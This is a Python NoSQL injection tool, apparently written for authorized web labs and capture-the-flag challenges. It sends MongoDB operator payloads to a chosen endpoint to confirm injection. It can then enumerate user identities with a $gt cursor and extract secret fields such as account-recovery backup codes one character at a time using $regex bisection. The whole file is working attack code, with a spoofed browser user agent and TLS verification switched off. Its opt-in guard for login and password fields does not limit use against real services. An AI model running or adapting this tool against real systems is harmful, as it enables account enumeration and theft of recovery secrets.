#!/usr/bin/env python3
"""nosqlquick.py — guarded JSON/query-string Mongo operator oracle for authorized web labs.

The tool is deliberately endpoint- and field-aware. It never sprays an app:
the caller must name the URL and every field that may receive an operator. Login,
registration, and password fields are refused unless --dangerous-auth is supplied.

Examples:
  # Establish a scalar baseline, then test single-field and paired $ne operators.
  python3 nosqlquick.py --url https://target/api/account/recover \
    --field email --field backupCode \
    --baseline email=none@example.test --baseline backupCode=invalid \
    --success-json status=verified --probe --map-query-shape

  # Enumerate identities through a monotonic $gt cursor while keeping every
  # other required field on an operator so validation guards cannot hide it.
  python3 nosqlquick.py --url https://target/api/account/recover \
    --field email --field backupCode --enumerate email --identity-json email \
    --success-json status=verified

  # Lock one record and extract a variable-length value with printable-ASCII
  # prefix classes, binary-searching each character and checking exact $eq.
  python3 nosqlquick.py --url https://target/api/account/recover \
    --field email --field backupCode --lock email=user@example.test \
    --extract backupCode --success-json status=verified

  # Probe a list endpoint's nested bracket parser. Full response bodies are kept
  # because a type-juggled $ne result can include public rows plus one private row.
  python3 nosqlquick.py --url https://target/api/items --query-container filter \
    --field is_public --baseline is_public=true --probe

Exit codes: 0 completed, 2 inconclusive/rate-limited, 3 circuit breaker,
4 safety refusal or invalid extraction setup.
"""
import argparse
import hashlib
import json
import os
import random
import re
import string
import sys
import time
from urllib.parse import urlsplit

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
AUTH_PATH = re.compile(r'/(?:api/)?(?:auth/)?(?:login|register|signup|sign-in|session)(?:/|$)', re.I)
DANGEROUS_FIELD = re.compile(r'(?:^|[_-])(?:password|passwd|passphrase|credential)(?:$|[_-])', re.I)
GATEWAY_FAILURES = {502, 503, 504}


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


def parse_value(raw):
    """Accept convenient field=value strings without forcing JSON quoting."""
    try:
        value = json.loads(raw)
        if isinstance(value, (dict, list)):
            return raw
        return value
    except ValueError:
        return raw


def parse_assignments(items, label):
    out = {}
    for item in items or []:
        if "=" not in item:
            raise ValueError("%s must be FIELD=VALUE: %s" % (label, item))
        key, value = item.split("=", 1)
        key = key.strip()
        if not key:
            raise ValueError("%s has an empty field name" % label)
        out[key] = parse_value(value)
    return out


def json_path(data, path):
    cur = data
    for part in path.split("."):
        if isinstance(cur, dict) and part in cur:
            cur = cur[part]
        else:
            return None
    return cur


def expected_value(raw):
    return parse_value(raw)


def parse_predicates(items):
    out = []
    for item in items or []:
        if "=" not in item:
            raise ValueError("--success-json must be PATH=VALUE: %s" % item)
        path, raw = item.split("=", 1)
        out.append((path.strip(), expected_value(raw)))
    return out


def response_signature(response):
    if isinstance(response, Exception):
        return ("ERR", type(response).__name__, "")
    ctype = (response.headers.get("content-type") or "").split(";", 1)[0].lower()
    return (response.status_code, ctype, response.text or "")


def regex_class(chars):
    """Escape a literal set for a Mongo/JavaScript regular-expression class."""
    return "".join("\\" + ch if ch in "\\-]^" else ch for ch in chars)


def alphabet_from_arg(value):
    if value == "printable":
        return "".join(chr(i) for i in range(32, 127))
    if value == "alnum":
        return string.digits + string.ascii_uppercase + string.ascii_lowercase
    if value == "hex":
        return string.digits + "abcdefABCDEF"
    if not value:
        raise ValueError("alphabet cannot be empty")
    # Preserve order while removing duplicates.
    return "".join(dict.fromkeys(value))


class Oracle:
    def __init__(self, args, predicates):
        self.args = args
        self.predicates = predicates
        self.session = requests.Session()
        self.headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        }
        if args.query_container:
            self.headers.pop("Content-Type")
        if args.token:
            self.headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.headers["Cookie"] = args.cookie
        for item in args.header:
            if ":" in item:
                key, value = item.split(":", 1)
                self.headers[key.strip()] = value.strip()
        parsed = urlsplit(args.url)
        self.health_url = "%s://%s/" % (parsed.scheme, parsed.netloc)
        self.health_before = self._health()
        self.requests = 0
        self.flags = set()
        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")
        self.response_dir = os.path.join(args.out, "responses")
        os.makedirs(self.response_dir, exist_ok=True)

    def _health(self):
        try:
            response = self.session.get(
                self.health_url, headers=self.headers, timeout=self.args.timeout,
                allow_redirects=False, verify=False)
            return response_signature(response)
        except requests.RequestException as exc:
            return ("ERR", type(exc).__name__, "")

    def _record(self, label, payload, response):
        if isinstance(response, Exception):
            record = {"label": label, "payload": payload, "error": repr(response)}
        else:
            stem = re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_") or "response"
            body_path = os.path.join(self.response_dir, stem + ".body")
            with open(body_path, "wb") as body_fh:
                body_fh.write(response.content)
            record = {
                "label": label,
                "payload": payload,
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": (response.text or "")[:4000],
                "body_bytes": len(response.content),
                "body_sha256": hashlib.sha256(response.content).hexdigest(),
                "response_body": os.path.relpath(body_path, self.args.out),
            }
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, payload, label):
        if self.requests:
            time.sleep(self.args.delay)
        self.requests += 1
        try:
            if self.args.query_container:
                response = self.session.get(
                    self.args.url, headers=self.headers, params=payload,
                    timeout=self.args.timeout, allow_redirects=False, verify=False)
            else:
                response = self.session.post(
                    self.args.url, headers=self.headers, json=payload,
                    timeout=self.args.timeout, allow_redirects=False, verify=False)
        except requests.RequestException as exc:
            self._record(label, payload, exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, payload, response)

        scan = (response.text or "") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        self.flags.update(FLAG_RE.findall(scan))
        if response.status_code == 429:
            retry = response.headers.get("Retry-After")
            raise Inconclusive("429 rate limit during %s%s" %
                               (label, " (Retry-After %s)" % retry if retry else ""))
        if response.status_code in GATEWAY_FAILURES:
            health_after = self._health()
            health_state = "changed" if health_after != self.health_before else "unchanged"
            raise CircuitBreak("%s returned HTTP %d; root health %s" %
                               (label, response.status_code, health_state))
        return response

    def success(self, response):
        if self.args.success_status:
            if response.status_code not in self.args.success_status:
                return False
        elif not 200 <= response.status_code < 300:
            return False
        if not self.predicates:
            return True
        try:
            data = response.json()
        except ValueError:
            return False
        return all(json_path(data, path) == value for path, value in self.predicates)

    def identity(self, response, path):
        try:
            return json_path(response.json(), path)
        except ValueError:
            return None


def payload_base(fields, baseline, locks):
    payload = {field: baseline.get(field, "__nosqlquick_invalid__") for field in fields}
    payload.update(locks)
    return payload


def print_response(label, response, success):
    ctype = (response.headers.get("content-type") or "-").split(";", 1)[0]
    print("%-28s HTTP %-3s %-24s success=%s" %
          (label, response.status_code, ctype, "yes" if success else "no"))


def nested_query_params(container, baseline, field=None, operator=None, value=None):
    params = {"%s[%s]" % (container, key): str(item).lower()
              if isinstance(item, bool) else str(item)
              for key, item in baseline.items()}
    if field is not None:
        params.pop("%s[%s]" % (container, field), None)
        suffix = "[%s]" % operator if operator else ""
        params["%s[%s]%s" % (container, field, suffix)] = value
    return params


def query_probe_mode(oracle, fields, baseline, container):
    """Probe bracket query parsing while retaining every full result set."""
    scalar_params = nested_query_params(container, baseline)
    scalar = oracle.send(scalar_params, "query-scalar-baseline")
    print("%-28s HTTP %-3s %6db sha256=%s" %
          ("scalar baseline", scalar.status_code, len(scalar.content),
           hashlib.sha256(scalar.content).hexdigest()[:12]))

    changed = 0
    operators = (("$ne", "1"), ("$gt", ""), ("$exists", "true"), ("$regex", ".*"))
    for field in fields:
        # The bare control guards the exact parser edge that causes false negatives:
        # filter[field][ne] is not Mongo's $ne operator and often silently no-ops.
        bare_params = nested_query_params(container, baseline, field, "ne", "1")
        bare = oracle.send(bare_params, "query-%s-bare-ne-control" % field)
        bare_sig = response_signature(bare)
        print("%-28s HTTP %-3s %6db control" %
              ((field + " bare [ne]")[:28], bare.status_code, len(bare.content)))

        for operator, value in operators:
            params = nested_query_params(container, baseline, field, operator, value)
            label = "query-%s-%s" % (field, operator.lstrip("$"))
            response = oracle.send(params, label)
            signature = response_signature(response)
            differs = signature != bare_sig
            if differs:
                changed += 1
            print("%-28s HTTP %-3s %6db %s saved=responses/%s.body" %
                  ((field + " [" + operator + "]")[:28], response.status_code,
                   len(response.content), "CANDIDATE" if differs else "unchanged",
                   re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_")))

    if changed:
        print("[+] CANDIDATE: %d $-prefixed nested operator response(s) differed from "
              "the bare [ne] control" % changed)
    else:
        print("[-] no nested-operator differential; inspect retained full bodies before clearing")
    print("[i] Full result sets were scanned for flags and saved under %s" % oracle.response_dir)
    return bool(changed)


def probe_mode(oracle, fields, baseline, locks, map_shape):
    base = payload_base(fields, baseline, locks)
    scalar = oracle.send(base, "scalar-baseline")
    scalar_success = oracle.success(scalar)
    print_response("scalar baseline", scalar, scalar_success)

    single = {}
    for field in fields:
        payload = dict(base)
        payload[field] = {"$ne": "__nosqlquick_impossible__"}
        response = oracle.send(payload, "single-ne-%s" % field)
        single[field] = oracle.success(response)
        print_response("single $ne: " + field, response, single[field])

    paired_payload = dict(base)
    for field in fields:
        if field not in locks:
            paired_payload[field] = {"$ne": "__nosqlquick_impossible__"}
    paired = oracle.send(paired_payload, "paired-ne")
    paired_success = oracle.success(paired)
    print_response("paired $ne", paired, paired_success)

    confirmed = paired_success and not scalar_success
    if confirmed:
        print("[+] CONFIRMED: paired Mongo-style operators reached a successful query path")
        for field, result in single.items():
            if not result:
                print("[i] %s single-field negative was guard-blocked/unknown, not disproven" % field)
    elif paired_success:
        print("[i] paired operators succeeded, but so did the scalar baseline; no differential")
    else:
        print("[-] no successful paired-operator differential; endpoint remains unconfirmed")

    if map_shape:
        shape_payload = dict(paired_payload)
        shape_field = "nosqlquick_shape_%08x" % random.getrandbits(32)
        shape_payload[shape_field] = "must-not-exist"
        shaped = oracle.send(shape_payload, "query-shape-extra-scalar")
        if response_signature(shaped) == response_signature(paired):
            print("[i] query shape: extra scalar field appears ignored (response identical)")
        else:
            print("[i] query shape: extra scalar field affected the response; full-body binding/validation possible")
    return confirmed


def enumerate_mode(oracle, target, fields, baseline, locks, identity_path, start, max_records):
    cursor = start
    found = []
    for index in range(max_records):
        payload = payload_base(fields, baseline, locks)
        for field in fields:
            if field in locks:
                continue
            payload[field] = ({"$gt": cursor} if field == target
                              else {"$ne": "__nosqlquick_impossible__"})
        response = oracle.send(payload, "enumerate-%s-%d" % (target, index + 1))
        if not oracle.success(response):
            break
        identity = oracle.identity(response, identity_path)
        if not isinstance(identity, str):
            print("[!] success response lacked string identity at %s; stopping" % identity_path)
            break
        if identity <= cursor or identity in found:
            print("[!] non-monotonic identity %r after %r; stopping to avoid a loop" %
                  (identity, cursor))
            break
        found.append(identity)
        cursor = identity
        print("[+] %s[%d] = %s" % (identity_path, len(found), identity))
    print("[*] enumerated %d unique value(s)" % len(found))
    return found


def extract_mode(oracle, target, fields, baseline, locks, alphabet, max_length):
    missing_locks = [field for field in fields if field != target and field not in locks]
    if missing_locks:
        raise ValueError("lock every non-target field for unambiguous extraction: %s" %
                         ", ".join(missing_locks))

    base = payload_base(fields, baseline, locks)

    def ask(operator, label):
        payload = dict(base)
        payload[target] = operator
        response = oracle.send(payload, label)
        return oracle.success(response)

    prefix = ""
    for position in range(max_length + 1):
        if ask({"$eq": prefix}, "extract-exact-%d" % position):
            print("[+] extracted %s = %s" % (target, prefix))
            return prefix
        if position == max_length:
            break

        full = "^" + re.escape(prefix) + "[" + regex_class(alphabet) + "]"
        if not ask({"$regex": full}, "extract-prefix-%d" % position):
            raise ValueError("no exact value and no printable continuation after %r" % prefix)

        candidates = list(alphabet)
        while len(candidates) > 1:
            midpoint = (len(candidates) + 1) // 2
            left, right = candidates[:midpoint], candidates[midpoint:]
            pattern = "^" + re.escape(prefix) + "[" + regex_class(left) + "]"
            if ask({"$regex": pattern}, "extract-bisect-%d-%d" %
                   (position, len(candidates))):
                candidates = left
            else:
                candidates = right
        prefix += candidates[0]
        print("[+] %s prefix: %r" % (target, prefix))
    raise ValueError("value exceeds --max-length %d or exact $eq is unsupported" % max_length)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True)
    ap.add_argument("--field", action="append", required=True,
                    help="field explicitly allowed to receive an operator; repeatable")
    ap.add_argument("--query-container", metavar="NAME",
                    help="use GET bracket params NAME[field][$op] instead of POST JSON")
    ap.add_argument("--baseline", action="append", default=[], metavar="FIELD=VALUE")
    ap.add_argument("--lock", action="append", default=[], metavar="FIELD=VALUE",
                    help="keep a field exact while enumerating/extracting another")
    mode = ap.add_mutually_exclusive_group()
    mode.add_argument("--probe", action="store_true", help="run scalar/single/paired $ne checks (default)")
    mode.add_argument("--enumerate", metavar="FIELD", help="enumerate a response identity with $gt")
    mode.add_argument("--extract", metavar="FIELD", help="extract a locked record's field with $regex/$eq")
    ap.add_argument("--identity-json", help="dot path returned by --enumerate (default: enumerated field)")
    ap.add_argument("--success-status", action="append", type=int, default=[])
    ap.add_argument("--success-json", action="append", default=[], metavar="PATH=VALUE")
    ap.add_argument("--map-query-shape", action="store_true")
    ap.add_argument("--start", default="", help="initial lexical cursor for --enumerate")
    ap.add_argument("--max-records", type=int, default=50)
    ap.add_argument("--alphabet", default="printable", help="printable (default), alnum, hex, or literal chars")
    ap.add_argument("--max-length", type=int, default=128)
    ap.add_argument("--token")
    ap.add_argument("--cookie")
    ap.add_argument("--header", action="append", default=[], help="extra 'Key: Value' header")
    ap.add_argument("--out", default="nosqlquick_out")
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--dangerous-auth", action="store_true",
                    help="explicitly allow login/register/password operator probes")
    args = ap.parse_args()

    fields = list(dict.fromkeys(args.field))
    try:
        baseline = parse_assignments(args.baseline, "--baseline")
        locks = parse_assignments(args.lock, "--lock")
        predicates = parse_predicates(args.success_json)
        alphabet = alphabet_from_arg(args.alphabet)
    except ValueError as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 4

    unknown = sorted((set(baseline) | set(locks)) - set(fields))
    if unknown:
        print("[!] baseline/lock field was not allowlisted with --field: %s" %
              ", ".join(unknown), file=sys.stderr)
        return 4
    dangerous = AUTH_PATH.search(urlsplit(args.url).path) or any(DANGEROUS_FIELD.search(f) for f in fields)
    if dangerous and not args.dangerous_auth:
        print("[!] SAFETY REFUSAL: login/register/password operator probes require --dangerous-auth",
              file=sys.stderr)
        return 4
    target = args.enumerate or args.extract
    if target and target not in fields:
        print("[!] target field %s is not allowlisted with --field" % target, file=sys.stderr)
        return 4
    if args.query_container:
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", args.query_container):
            print("[!] --query-container must be one plain parameter name", file=sys.stderr)
            return 4
        if any(not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", field) for field in fields):
            print("[!] query-mode fields must be plain names without brackets or $", file=sys.stderr)
            return 4
        if target or args.map_query_shape or locks:
            print("[!] query mode supports the bounded --probe matrix only", file=sys.stderr)
            return 4
        missing = [field for field in fields if field not in baseline]
        if missing:
            print("[!] query mode requires a known scalar --baseline for every field: %s" %
                  ", ".join(missing), file=sys.stderr)
            return 4

    try:
        oracle = Oracle(args, predicates)
        if args.query_container:
            query_probe_mode(oracle, fields, baseline, args.query_container)
        elif args.enumerate:
            identity = args.identity_json or args.enumerate
            enumerate_mode(oracle, args.enumerate, fields, baseline, locks,
                           identity, args.start, args.max_records)
        elif args.extract:
            extract_mode(oracle, args.extract, fields, baseline, locks,
                         alphabet, args.max_length)
        else:
            probe_mode(oracle, fields, baseline, locks, args.map_query_shape)
        if oracle.flags:
            print("\n" + "!" * 60)
            for flag in sorted(oracle.flags):
                print("FLAG: " + flag)
            print("!" * 60)
        print("[*] probes=%d saved=%s" % (oracle.requests, oracle.log_path))
        return 0
    except Inconclusive as exc:
        print("[!] INCONCLUSIVE: %s" % exc, file=sys.stderr)
        return 2
    except CircuitBreak as exc:
        print("[!] CIRCUIT BREAKER: %s" % exc, file=sys.stderr)
        return 3
    except ValueError as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
